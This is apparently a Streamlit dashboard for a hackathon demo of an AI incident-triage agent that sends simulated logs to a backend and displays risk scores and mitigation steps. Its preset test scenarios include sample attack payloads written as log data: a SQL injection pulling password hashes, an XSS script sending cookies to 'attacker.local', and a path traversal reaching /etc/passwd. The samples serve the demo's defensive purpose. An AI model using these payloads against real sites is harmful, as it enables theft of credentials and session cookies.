import streamlit as st
import json
import uuid
from datetime import datetime, timezone
import httpx

st.set_page_config(
    page_title="Huawei Cloud MaaS — Autonomous Incident Triage & Active Defense",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom High-End Styling: Cyber Dark / Glassmorphic Theme
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap');

    html, body, [class*="css"] {
        font-family: 'Plus Jakarta Sans', sans-serif;
    }

    code, pre, .terminal-box {
        font-family: 'JetBrains Mono', monospace !important;
    }

    /* Main background */
    .stApp {
        background-color: #07090e;
        color: #e2e8f0;
    }

    /* Hero Banner */
    .hero-banner {
        background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(20, 30, 55, 0.6) 100%);
        border: 1px solid rgba(56, 189, 248, 0.2);
        border-radius: 16px;
        padding: 24px 32px;
        margin-bottom: 24px;
        backdrop-filter: blur(12px);
        box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
    }

    .status-pulse {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: rgba(16, 185, 129, 0.15);
        border: 1px solid rgba(16, 185, 129, 0.4);
        color: #34d399;
        padding: 6px 14px;
        border-radius: 9999px;
        font-size: 13px;
        font-weight: 600;
        letter-spacing: 0.5px;
    }

    .pulse-dot {
        width: 8px;
        height: 8px;
        background-color: #10b981;
        border-radius: 50%;
        box-shadow: 0 0 10px #10b981;
        animation: pulse 1.8s infinite;
    }

    @keyframes pulse {
        0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
        70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(16, 185, 129, 0); }
        100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
    }

    /* KPI Cards */
    .kpi-card {
        background: rgba(15, 23, 42, 0.75);
        border: 1px solid rgba(51, 65, 85, 0.6);
        border-radius: 14px;
        padding: 18px 22px;
        transition: all 0.25s ease;
        backdrop-filter: blur(8px);
    }

    .kpi-card:hover {
        border-color: rgba(56, 189, 248, 0.5);
        transform: translateY(-2px);
        box-shadow: 0 8px 24px -6px rgba(0, 0, 0, 0.6);
    }

    .kpi-title {
        color: #94a3b8;
        font-size: 12px;
        text-transform: uppercase;
        letter-spacing: 1px;
        font-weight: 600;
        margin-bottom: 6px;
    }

    .kpi-value {
        font-size: 26px;
        font-weight: 800;
        color: #f8fafc;
    }

    .badge-soc {
        background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%);
        color: #ffffff !important;
        padding: 6px 14px;
        border-radius: 8px;
        font-weight: 700;
        display: inline-block;
        box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
    }

    .badge-sre {
        background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
        color: #ffffff !important;
        padding: 6px 14px;
        border-radius: 8px;
        font-weight: 700;
        display: inline-block;
        box-shadow: 0 4px 12px rgba(2, 132, 199, 0.4);
    }

    /* Terminal mitigation box */
    .terminal-header {
        background: #1e293b;
        color: #94a3b8;
        padding: 8px 16px;
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
        font-size: 12px;
        font-weight: 600;
        border: 1px solid #334155;
        border-bottom: none;
        display: flex;
        align-items: center;
        gap: 8px;
    }

    .terminal-dots {
        display: flex;
        gap: 6px;
    }
    .dot { width: 10px; height: 10px; border-radius: 50%; }
    .dot-red { background-color: #ef4444; }
    .dot-yellow { background-color: #f59e0b; }
    .dot-green { background-color: #10b981; }

    /* Custom button styling */
    .stButton>button {
        background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
        color: white;
        border: 1px solid rgba(255, 255, 255, 0.15);
        border-radius: 10px;
        padding: 12px 24px;
        font-weight: 700;
        font-size: 15px;
        letter-spacing: 0.3px;
        box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
        transition: all 0.2s ease;
    }

    .stButton>button:hover {
        background: linear-gradient(135deg, #1d4ed8 0%, #1e40af 100%);
        transform: translateY(-1px);
        box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
    }
</style>
""", unsafe_allow_html=True)

# Sidebar
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/shield.png", width=56)
    st.markdown("### **AI Triage Agent Engine**")
    st.caption("Huawei Cloud MaaS Hackathon • Reference Arch v3.0")
    
    st.markdown("---")
    st.markdown("#### ⚡ **Conectividad & Telemetría**")
    fastapi_url = st.text_input("FastAPI Endpoint", "http://localhost:8000/webhook/n8n")
    
    st.markdown("#### 📊 **Impacto de Negocio (KPIs)**")
    col_sb1, col_sb2 = st.columns(2)
    with col_sb1:
        st.metric("MTTD Manual", "30 min")
    with col_sb2:
        st.metric("MTTD IA", "< 15 seg", delta="-99.2%")
    
    st.markdown("---")
    st.markdown("#### 🧠 **Modelos Activos**")
    st.markdown("🟢 **Primario:** Pangu 40B (Huawei MaaS)")
    st.markdown("🟡 **Failover:** GPT-4 / OpenAI-Spec")
    st.markdown("🟢 **Persistencia:** MongoDB Atlas (Motor)")

# Hero Header Banner
st.markdown("""
<div class="hero-banner">
    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px;">
        <div>
            <h1 style="margin: 0; font-size: 28px; font-weight: 800; color: #f8fafc; letter-spacing: -0.5px;">
                🛡️ Sistema de Triage Autónomo & Defensa Activa
            </h1>
            <p style="margin: 6px 0 0 0; color: #94a3b8; font-size: 14px;">
                Detección inteligente de anomalías de infraestructura y contención inmediata de incidentes de ciberseguridad en tiempo real.
            </p>
        </div>
        <div>
            <div class="status-pulse">
                <div class="pulse-dot"></div>
                AGENTIC ENGINE ONLINE
            </div>
        </div>
    </div>
</div>
""", unsafe_allow_html=True)

# Layout: Left Column (Input/Chaos Simulator) - Right Column (Agent Results)
col_left, col_right = st.columns([1.1, 1.2], gap="large")

with col_left:
    st.markdown("### 🚨 **Consola de Ingesta & Inyección de Fallos**")
    
    preset = st.selectbox(
        "🎯 Selecciona un escenario de prueba para simular:",
        [
            "Custom...",
            "🚨 [Cyber Attack] Inyección SQL en Endpoint de Auth (UNION SELECT)",
            "🚨 [Cyber Attack] Inyección XSS en Parámetro de Búsqueda (<script>)",
            "🚨 [Cyber Attack] Path Traversal Intentando Exfiltrar /etc/passwd",
            "💥 [Chaos Infra] Caída de Base de Datos (Atlas TCP 27017 Blocked)",
            "💥 [Chaos Infra] OOM Container Crash (Memoria > 512MB)"
        ]
    )

    preset_map = {
        "🚨 [Cyber Attack] Inyección SQL en Endpoint de Auth (UNION SELECT)": {
            "source": "security-scanner",
            "component": "auth",
            "log": "192.168.10.45 - POST /api/auth/login query: username=admin' UNION SELECT 1,username,password_hash FROM users-- status: 401",
            "is_sec": True,
            "sev": "P1"
        },
        "🚨 [Cyber Attack] Inyección XSS en Parámetro de Búsqueda (<script>)": {
            "source": "security-scanner",
            "component": "frontend",
            "log": "192.168.10.88 - GET /dashboard/search?q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script> status: 200",
            "is_sec": True,
            "sev": "P1"
        },
        "🚨 [Cyber Attack] Path Traversal Intentando Exfiltrar /etc/passwd": {
            "source": "security-scanner",
            "component": "frontend",
            "log": "192.168.10.92 - GET /api/static/../../../../etc/passwd status: 403",
            "is_sec": True,
            "sev": "P1"
        },
        "💥 [Chaos Infra] Caída de Base de Datos (Atlas TCP 27017 Blocked)": {
            "source": "mongodb",
            "component": "database",
            "log": "MongoNetworkError: connection 1 to cluster0.mongodb.net:27017 timed out after 2000ms. Egress packet rejected by firewall.",
            "is_sec": False,
            "sev": "P1"
        },
        "💥 [Chaos Infra] OOM Container Crash (Memoria > 512MB)": {
            "source": "nextjs",
            "component": "frontend",
            "log": "fatal error: runtime: out of memory allocating 629145600 bytes. Killed process 1422 (node). cgroup memory limit exceeded.",
            "is_sec": False,
            "sev": "P1"
        }
    }

    selected_data = preset_map.get(preset, {})

    col_meta1, col_meta2 = st.columns(2)
    with col_meta1:
        source = st.selectbox(
            "Origen (source)", 
            ["nextjs", "mongodb", "n8n", "security-scanner"],
            index=["nextjs", "mongodb", "n8n", "security-scanner"].index(selected_data.get("source", "nextjs"))
        )
    with col_meta2:
        component = st.selectbox(
            "Componente (component)", 
            ["frontend", "database", "network", "auth"],
            index=["frontend", "database", "network", "auth"].index(selected_data.get("component", "frontend"))
        )

    is_sec = st.checkbox("🔒 Forzar bandera de evento de ciberseguridad", value=selected_data.get("is_sec", False))

    raw_log = st.text_area(
        "📄 Log Crudo / Telemetría Capturada",
        value=selected_data.get("log", ""),
        height=130,
        placeholder="Pega aquí el log o mensaje de error capturado..."
    )

    if st.button("🚀 Ejecutar Triage Autónomo con LangGraph", type="primary", use_container_width=True):
        if not raw_log.strip():
            st.error("Por favor ingresa un log válido para analizar.")
        else:
            payload = {
                "incident_id": str(uuid.uuid4()),
                "source": source,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "component": component,
                "raw_log": raw_log.strip(),
                "is_security_event": is_sec,
                "severity_hint": selected_data.get("sev", "P2")
            }

            with st.spinner("⚡ LangGraph ejecutando pipeline de razonamiento, healthchecks y Pangu 40B..."):
                try:
                    target_url = fastapi_url.strip()
                    if not target_url.endswith("/webhook/n8n") and not target_url.endswith("/triage") and not target_url.endswith("/"):
                        target_url = f"{target_url}/webhook/n8n"
                    
                    res = httpx.post(target_url, json=payload, timeout=15.0)
                    if res.status_code == 200:
                        st.session_state["last_triage"] = res.json()
                        st.session_state["last_payload"] = payload
                        st.success("✨ ¡Triage completado con éxito en < 1.5s!")
                    else:
                        st.error(f"Error {res.status_code}: {res.text}")
                except Exception as e:
                    st.error(f"Error de conexión: {str(e)}")

with col_right:
    st.markdown("### 📊 **Diagnóstico & Plan de Acción en Vivo**")
    
    if "last_triage" in st.session_state:
        data = st.session_state["last_triage"]
        is_security = (data.get("escalation_team") == "SOC") or (data.get("risk_score", 0) >= 10.0)
        
        # 3 KPI Cards
        kpi_col1, kpi_col2, kpi_col3 = st.columns(3)
        
        with kpi_col1:
            st.markdown(f"""
            <div class="kpi-card">
                <div class="kpi-title">Risk Score</div>
                <div class="kpi-value" style="color: {'#ef4444' if data.get('risk_score', 0) >= 8.0 else '#f59e0b'};">
                    {data.get('risk_score', 0):.1f}<span style="font-size: 16px; color: #64748b;">/10</span>
                </div>
            </div>
            """, unsafe_allow_html=True)
            
        with kpi_col2:
            st.markdown(f"""
            <div class="kpi-card">
                <div class="kpi-title">Severidad</div>
                <div class="kpi-value" style="color: {'#ef4444' if data.get('severity') == 'P1' else '#38bdf8'};">
                    {data.get('severity', 'P2')}
                </div>
            </div>
            """, unsafe_allow_html=True)
            
        with kpi_col3:
            team_label = data.get('escalation_team', 'N/A')
            badge_class = "badge-soc" if is_security else "badge-sre"
            st.markdown(f"""
            <div class="kpi-card">
                <div class="kpi-title">Escalamiento</div>
                <div style="margin-top: 4px;"><span class="{badge_class}">{team_label}</span></div>
            </div>
            """, unsafe_allow_html=True)

        st.markdown("<br>", unsafe_allow_html=True)

        # Tabs for categorized analysis
        tab_summary, tab_mitigation, tab_checklist, tab_json = st.tabs([
            "🎯 Causa Raíz",
            "🛡️ Comandos de Mitigación",
            "📋 Checklist del Operador",
            "🔍 JSON Raw Payload"
        ])

        with tab_summary:
            st.markdown("#### **Hipótesis Generada por el Modelo**")
            alert_type = "error" if is_security else "warning"
            if is_security:
                st.error(f"🚨 **INCIDENTE DE CIBERSEGURIDAD DETECTADO**\n\n{data.get('root_cause_hypothesis')}")
            else:
                st.info(f"⚙️ **FALLO OPERACIONAL / INFRAESTRUCTURA**\n\n{data.get('root_cause_hypothesis')}")

        with tab_mitigation:
            st.markdown("#### **Acciones Defensivas / Comandos CLI**")
            st.caption("Comandos seguros y no destructivos generados por el agente para mitigar el incidente:")
            
            st.markdown("""
            <div class="terminal-header">
                <div class="terminal-dots">
                    <div class="dot dot-red"></div>
                    <div class="dot dot-yellow"></div>
                    <div class="dot dot-green"></div>
                </div>
                <span>bash - defensive_mitigation.sh</span>
            </div>
            """, unsafe_allow_html=True)
            
            st.code(data.get("mitigation_commands") or "# Sin comandos adicionales requeridos", language="bash")

        with tab_checklist:
            st.markdown("#### **Procedimiento Operativo Paso a Paso**")
            st.caption("Tareas de validación para el ingeniero asignado:")
            checklist_items = data.get("checklist", [])
            for idx, item in enumerate(checklist_items):
                st.checkbox(f"{item}", key=f"step_{idx}_{item[:15]}", value=False)

        with tab_json:
            st.markdown("#### **Respuesta Completa de FastAPI / LangGraph**")
            st.json(data)

    else:
        st.markdown("""
        <div style="text-align: center; padding: 60px 20px; border: 2px dashed rgba(51, 65, 85, 0.5); border-radius: 16px; background: rgba(15, 23, 42, 0.3);">
            <img src="https://img.icons8.com/fluency/96/radar.png" width="64" style="opacity: 0.8; margin-bottom: 12px;" />
            <h3 style="color: #94a3b8; font-weight: 600; margin: 0;">Esperando Señales de Telemetría</h3>
            <p style="color: #64748b; font-size: 14px; max-width: 380px; margin: 8px auto 0 auto;">
                Selecciona un escenario de prueba en el panel izquierdo y haz clic en <b>"Ejecutar Triage Autónomo"</b> para ver el diagnóstico en tiempo real.
            </p>
        </div>
        """, unsafe_allow_html=True)
